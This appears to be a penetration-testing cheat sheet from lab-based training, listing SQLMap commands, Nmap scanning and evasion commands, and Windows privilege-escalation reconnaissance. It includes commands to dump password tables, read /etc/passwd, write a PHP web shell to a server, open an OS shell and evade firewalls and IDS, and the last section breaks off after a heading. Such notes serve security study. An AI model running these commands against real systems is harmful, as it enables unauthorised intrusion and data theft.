# SQLMap Essentials

- **SQLMap Overview** : `python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'` , `sqlmap -hh`
- **Getting Started with SQLMap** : `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`
- **SQLMap Output Description** :
- **Running SQLMap on an HTTP Request** : `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'` , `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'` , `sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid` , `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` , `sqlmap -r req.txt` , `sqlmap -u www.target.com --data='id=1' --method PUT` , `sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
- **Handling SQLMap Errors** : `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` , `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch`
- **Attack Tuning** : `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` , `sqlmap -u www.example.com/?id=1 -v 3 --level=5` , `sqlmap -u www.example.com/?id=1 --level=5 --risk=3`
- **Database Enumeration** : `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` , `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` , `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb` , `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` , `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3` , `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` , `--dump-all --exclude-sysdbs`
- **Advanced Database Enumeration** : `sqlmap -u "http://www.example.com/?id=1" --schema` , `sqlmap -u "http://www.example.com/?id=1" --search -T user` , `sqlmap -u "http://www.example.com/?id=1" --search -C pass` , `sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users` , `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` , `sqlmap -u "http://www.example.com/?id=1" --all --batch`
- **Bypassing Web Application Protections** : `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` , `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI` , `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
- **OS Exploitation** : `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` , `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` , `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` , `sqlmap -u "http://www.example.com/?id=1" --os-shell` , `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`


# Network Enumeration With Nmap

- **Introduction to Nmap** : `nmap --help` , `sudo nmap -sS localhost`
- **Host Discovery** : `sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5` , `sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d" " -f5` , `sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d" " -f5` , `sudo nmap -sn -oA tnet 10.129.2.18-20 | grep for | cut -d" " -f5` , `sudo nmap 10.129.2.18 -sn -oA host` , `sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace` , `sudo nmap 10.129.2.18 -sn -oA host -PE --reason` , `sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping`
- **Host and Port Scanning** : `sudo nmap 10.129.2.28 --top-ports=10` , `sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping` , `sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT` , `sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn` , `sudo nmap 10.129.2.28 -F -sU` , `sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 137 --reason` , `sudo nmap 10.129.2.28 -sU -Pn -n --disable-arp-ping --packet-trace -p 100 --reason` , `sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV`
- **Saving the Results** : `sudo nmap 10.129.2.28 -p- -oA target` , `xsltproc target.xml -o target.html`
- **Service Enumeration** : `sudo nmap 10.129.2.28 -p- -sV` , `sudo nmap 10.129.2.28 -p- -sV --stats-every=5s` , `sudo nmap 10.129.2.28 -p- -sV -v` , `sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace` , `sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28`
- **Nmap Scripting Engine** : `sudo nmap <target> -sC` , `sudo nmap <target> --script <category>` , `sudo nmap <target> --script <script-name>,<script-name>,...` , `sudo nmap 10.129.2.28 -p 80 -sV --script vuln`
- **Performance** : `sudo nmap 10.129.2.0/24 -F` , `sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms` , `sudo nmap 10.129.2.0/24 -F | grep "/tcp" | wc -l` , `sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep "/tcp" | wc -l` , `sudo nmap 10.129.2.0/24 -F -oN tnet.default` , `sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300` , `sudo nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5`
- **Firewall and IDS/IPS Evasion** : `sudo nmap 10.129.2.28 -p 21,22,25 -sS -Pn -n --disable-arp-ping --packet-trace` , `sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace` , `sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5` , `sudo nmap 10.129.2.28 -n -Pn -p445 -O` , `sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0` , `sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace` , `sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53` , `ncat -nv --source-port 53 10.129.2.28 50000`


# Windows Privilege Escalation

#### Situational Awareness
```
ipconfig /all
```
```
arp -a
```
```
route print
```
```
Get-MpComputerStatus
```
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
```
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

####  






































